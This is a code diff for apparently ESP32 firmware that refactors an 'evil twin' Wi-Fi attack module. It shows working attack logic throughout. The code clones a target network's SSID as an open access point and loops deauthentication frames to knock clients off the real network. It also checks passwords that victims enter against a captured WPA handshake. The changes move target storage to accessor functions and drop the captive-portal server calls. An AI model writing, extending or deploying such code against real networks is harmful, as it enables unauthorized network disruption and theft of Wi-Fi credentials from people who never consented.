@@ -7,7 +7,6 @@
 #include "server.h"
 #include "evil_twin.h"
 #include "aircrack.h"
-#include "wifi_attacks.h"
 #include "sniffer.h"
 
 
@@ -15,7 +14,6 @@
 
 /* Store target information */
 static const char *TAG = "EVIL_TWIN";
-static target_info_t target = { 0 };
 static TaskHandle_t evil_twin_task_handle = NULL;
 
 
@@ -24,15 +22,16 @@ static void evil_twin_task(void *pvParameters)
     vTaskDelay(pdMS_TO_TICKS(1000));
 
     /* Get target information */
+    target_info_t *target = target_get(TARGET_INFO_EVIL_TWIN);
     /*Try guess by ssid */
-    target.vendor = getVendor((char *)&target.ssid);
+    target->vendor = getVendor((char *)&target->ssid);
 
     /* Clone Access Point */
     wifi_config_t wifi_config = {
         .ap = {
             .ssid = { 0 },
             .ssid_len = 0,
-            .channel = target.channel,
+            .channel = target->channel,
             .password = "",
             .max_connection = 8,
             .authmode = WIFI_AUTH_OPEN,
@@ -43,21 +42,12 @@ static void evil_twin_task(void *pvParameters)
             }
         },
     };
-    strcpy((char *)&wifi_config.ap.ssid, (char *)&target.ssid);
+    strcpy((char *)&wifi_config.ap.ssid, (char *)&target->ssid);
     wifi_ap_clone(&wifi_config, NULL);
-
-    /* Close admin server */
-    http_admin_server_stop();
-
     /* Wait AP to be cloned */
-    vTaskDelay(pdMS_TO_TICKS(5000));
-
-    /* Start captive portal server */
-    http_attack_server_start();
-
-    /* Start wifi attack engine */
-    wifi_sniffer_set_mode(SNIFF_MODE_ATTACK_EVIL_TWIN);
-    wifi_start_sniffing(&target);
+    vTaskDelay(pdMS_TO_TICKS(2000));
+    /* Start sniffer and beacon tracking */
+    wifi_start_sniffing(target, SNIFF_MODE_ATTACK_EVIL_TWIN);
     wifi_start_beacon_tracking();
     
     while(true)
@@ -65,17 +55,17 @@ static void evil_twin_task(void *pvParameters)
         /* Spam softAP beacon from STA */
         //wifi_attack_softap_beacon_spam((target_info_t * )&target);
         /* Send deauth to clients */
-        wifi_attack_deauth_basic(NULL, target.bssid, 7);
+        wifi_attack_deauth_basic(NULL, target->bssid, 7);
         vTaskDelay(pdMS_TO_TICKS(20));
         //wifi_attack_deauth_client_bad_msg1();
-        wifi_attack_deauth_client_negative_tx_power(target.bssid, target.channel, (char *)&target.ssid);
+        wifi_attack_deauth_client_negative_tx_power(target->bssid, target->channel, (char *)&target->ssid);
         //wifi_attack_association_sleep();
         vTaskDelay(pdMS_TO_TICKS(100));
     }
 }
 
 
-void evil_twin_start_attack(target_info_t *targe_info)
+void evil_twin_start_attack(const target_info_t *targe_info)
 {
     if( evil_twin_task_handle != NULL )
     {   
@@ -83,11 +73,11 @@ void evil_twin_start_attack(target_info_t *targe_info)
         return;
     }
 
-    memcpy(&target, targe_info, sizeof(target_info_t));
+    target_set(targe_info, TARGET_INFO_EVIL_TWIN);
     xTaskCreate(evil_twin_task, "evil_twin_task", 4096, NULL, EVIL_TWIN_TASK_PRIO, &evil_twin_task_handle);
 
     ESP_LOGI(TAG, "Evil-Twin attack started.");
-    ESP_LOGI(TAG, "TARGET: %s on Channel %d.", target.ssid, target.channel);
+    ESP_LOGI(TAG, "TARGET: %s on Channel %d.", target_get(TARGET_INFO_EVIL_TWIN)->ssid, target_get(TARGET_INFO_EVIL_TWIN)->channel);
 }
 
 
@@ -98,31 +88,16 @@ void evil_twin_stop_attack(void)
         ESP_LOGE(TAG, "EvilTwin task is not running.");
         return;
     }
-       
     /* Kill task */
     vTaskDelete(evil_twin_task_handle);
     evil_twin_task_handle = NULL;
-
-    /* Close attack server */
-    http_attack_server_stop();
-
     /* Stop sniffer and beacon tracking */
     wifi_stop_beacon_tracking();
     wifi_stop_sniffing();
-    wifi_sniffer_set_mode(SNIFF_MODE_IDLE);
-
     /* Wait engine stop */
     vTaskDelay(pdMS_TO_TICKS(1000));
-
     /* Restore original hotspot */
     wifi_start_softap();
-
-    /* Wait softap restore */
-    vTaskDelay(pdMS_TO_TICKS(1000));
-
-    /* Start Admin server */
-    http_admin_server_start();
-
     ESP_LOGI(TAG, "Evil-Twin attack stopped.");
 }
 
@@ -130,6 +105,7 @@ void evil_twin_stop_attack(void)
 bool evil_twin_check_password(char *password)
 {
     const handshake_info_t *handshake = wifi_sniffer_get_handshake();
+    const target_info_t target = *target_get(TARGET_INFO_EVIL_TWIN);
 
     if( handshake->handshake_captured)
     {
@@ -141,10 +117,4 @@ bool evil_twin_check_password(char *password)
     }
     
     return false;
-}
-
-
-target_info_t* evil_twin_get_target_info(void)
-{
-    return &target;
 }
